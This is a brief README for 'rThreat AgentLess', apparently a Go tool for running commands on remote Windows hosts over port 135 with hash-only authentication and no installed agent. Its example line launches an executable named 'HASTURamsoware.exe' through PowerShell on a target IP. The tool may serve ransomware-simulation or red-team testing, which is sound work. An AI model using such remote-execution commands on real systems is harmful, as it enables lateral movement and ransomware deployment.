# rThreat AgentLess


Features:
- Can authenticate using hash-only
- Don't need to install impacket
- Native go and byte bashing on TCP sockets, no need to run on Windows

Limitations:
- Lots of limitations but fulfills its mission
- Long commands won't work. Make them shorter, execute coomand by command in final implementation

Example:
`./rThreatAgentless -target "192.168.249.181:135" -username "jesus" -password "password" -command "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -command & {( Start-Process -FilePath C:\Windows\Temp\HASTURamsoware.exe )}"`
